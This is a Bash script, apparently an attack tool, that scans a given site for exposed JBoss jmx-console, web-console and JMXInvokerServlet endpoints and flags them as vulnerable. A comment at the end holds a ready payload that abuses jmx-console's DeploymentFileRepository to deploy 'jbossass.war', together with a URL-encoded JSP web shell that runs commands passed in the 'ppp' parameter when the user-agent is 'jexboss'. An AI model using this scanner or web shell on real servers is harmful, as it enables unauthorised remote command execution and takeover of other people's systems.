#!/bin/bash

control_c(){
        tput clear
        rm -f /tmp/tempfile
	echo "Exiting..."
	exit 1
}
trap control_c SIGINT # Ctrl+C

RED='\e[0;91m'
GREEN='\e[0;92m'
RESET='\e[0m'

URL=$1
exploit(){
	tput clear
	echo "$RED[VULNERABLE]$RESET Loading exploit.."
	if [[ $1 = 0 ]]; then
		echo $URL${VULNLINKS[$1]}
	fi
	exit 1
}

if [ "$1" ]; then
	VULNLINKS=("/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo" "/web-console/ServerInfo.jsp" "/invoker/JMXInvokerServlet")
	VULNCHECK[0]=`curl -s -o "/dev/null" -w "%{http_code}" "$URL${VULNLINKS[0]}"`
	VULNCHECK[1]=`curl -s -o "/dev/null" -w "%{http_code}" "$URL${VULNLINKS[1]}"`
	VULNCHECK[2]=`curl -s -o "/dev/null" -w "%{http_code}" "$URL${VULNLINKS[2]}"`
	if [[ ${VULNCHECK[@]} =~ "200" || ${VULNCHECK[@]} =~ "500" ]]; then
		for element in $(seq 0 $((${#VULNCHECK[@]} - 1))); do
			if [[ ${VULNCHECK[$element]} = '200' || ${VULNCHECK[$element]} = '500' ]]; then
				exploit $element
			fi
		done
	else
		echo 'Nao'
	fi
	exit 1
else
	echo "Usage: ./jboss.sh site.com.br"
fi
wait

# /jmx-console/HtmlAdaptor
#payload "/jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.admin:service=DeploymentFileRepository&methodName=store&argType=java.lang.String&arg0=jbossass.war&argType=java.lang.String&arg1=jbossass&argType=java.lang.String&arg2=.jsp&argType=java.lang.String&arg3="+jsp+"&argType=boolean&arg4=True"
#"%3C%25%40%20%70%61%67%65%20%69%6D%70%6F%72%74%3D%22%6A%61%76%61%2E%75%74%69%6C%2E%2A%2C%6A%61%76%61%2E%69%6F%2E%2A%22%25%3E%3C%70%72%65%3E%3C%25%20%69%66%20%28%72%65%71%75%65%73%74%2E%67%65%74%50%61%72%61%6D%65%74%65%72%28%22%70%70%70%22%29%20%21%3D%20%6E%75%6C%6C%20%26%26%20%72%65%71%75%65%73%74%2E%67%65%74%48%65%61%64%65%72%28%22%75%73%65%72%2D%61%67%65%6E%74%22%29%2E%65%71%75%61%6C%73%28%22%6A%65%78%62%6F%73%73%22%29%29%20%7B%20%50%72%6F%63%65%73%73%20%70%20%3D%20%52%75%6E%74%69%6D%65%2E%67%65%74%52%75%6E%74%69%6D%65%28%29%2E%65%78%65%63%28%72%65%71%75%65%73%74%2E%67%65%74%50%61%72%61%6D%65%74%65%72%28%22%70%70%70%22%29%29%3B%20%44%61%74%61%49%6E%70%75%74%53%74%72%65%61%6D%20%64%69%73%20%3D%20%6E%65%77%20%44%61%74%61%49%6E%70%75%74%53%74%72%65%61%6D%28%70%2E%67%65%74%49%6E%70%75%74%53%74%72%65%61%6D%28%29%29%3B%20%53%74%72%69%6E%67%20%64%69%73%72%20%3D%20%64%69%73%2E%72%65%61%64%4C%69%6E%65%28%29%3B%20%77%68%69%6C%65%20%28%20%64%69%73%72%20%21%3D%20%6E%75%6C%6C%20%29%20%7B%20%6F%75%74%2E%70%72%69%6E%74%6C%6E%28%64%69%73%72%29%3B%20%64%69%73%72%20%3D%20%64%69%73%2E%72%65%61%64%4C%69%6E%65%28%29%3B%20%7D%20%7D%25%3E"

# /invoker/JMXInvokerServlet
